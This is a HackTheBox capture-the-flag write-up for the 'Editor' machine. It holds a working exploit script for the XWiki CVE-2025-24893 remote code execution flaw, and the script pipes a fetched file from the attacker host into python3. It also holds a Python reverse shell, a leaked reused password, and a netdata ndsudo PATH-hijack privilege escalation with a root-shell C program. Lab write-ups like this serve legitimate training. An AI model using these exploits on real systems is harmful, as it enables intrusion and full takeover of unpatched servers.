```json
Alias: Editor
Date: 13-08_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.80
```

# Editor
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-13 18:57 +0500
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.095s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-methods:
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.17 seconds
```
## Discovered Subdomains
```
editor.htb
wiki.editor.htb
```

---
# Enumeration

An instance of xwiki is running on port 8080 with the domain `xwiki.editor.htb` and is vulnerable to [Unauthenticated RCE](https://www.offsec.com/blog/cve-2025-24893/)

---

# Exploitation

I modified [this](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py) script to get RCE

```python
import requests

IP = "10.10.16.59"
PORT = "80"

# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Made By Al Baradi Joy")
    print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%5B%22bash%22%2C%20%22-c%22%2C%20%22curl%20http://{IP}:{PORT}/revshell.py%20|%20python3%22%5D.execute%28%29.text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"

    try:
        print(f"[+] Sending request to: {exploit_url}")
        response = requests.get(exploit_url, timeout=10)

        print("[✔] Exploit successful! Output received:")
        print(response.text)

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    target = "wiki.editor.htb/xwiki"
    exploit(target)

```

Start an http server and serve this python reverse shell under the name `revshell.py`, modify the IP and port on the script and the reverse shell.

```python
import socket,os,pty
s=socket.socket()
s.connect(("10.10.16.59",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("bash")
```

and we get a shell as `xwiki`

---

# Lateral Movement

## Local Enumeration

Looking for the database password, I found it in `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` and we have a case of password re-use. We can use this password to ssh to oliver

| Username | Password        |
| -------- | --------------- |
| oliver   | theEd1t0rTeam99 |

---

# Privilege Escalation

First thing I noticed is that we are in a group named `netdata` as Oliver and have access to the `/opt/netdata` directory. Searching for `netdata` privesc I found [this](https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5). So, here are the steps to root:

>Compile this locally and transfer it to the box
```c
#include <stdio.h>
#include <unistd.h>

int main() {
    // Set real, effective, and saved UID/GID to root
    if (setuid(0) != 0 || setgid(0) != 0) {
        perror("Failed to escalate privileges");
        return 1;
    }

    // Drop into a root shell
    char *args[] = { "/bin/sh", NULL };
    execvp(args[0], args);

    // If exec fails
    perror("execvp");
    return 1;
}

```

```bash
gcc privesc.c -o nvme
```

Make sure the file name is `nvme`. Then:
```bash
cd /var/tmp
wget http://$IP:$PORT/nvme
chmod +x nvme
export PATH=$PATH:/var/tmp
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

And we should be root!

---

# Flags
- user.txt
- root.txt

#CTF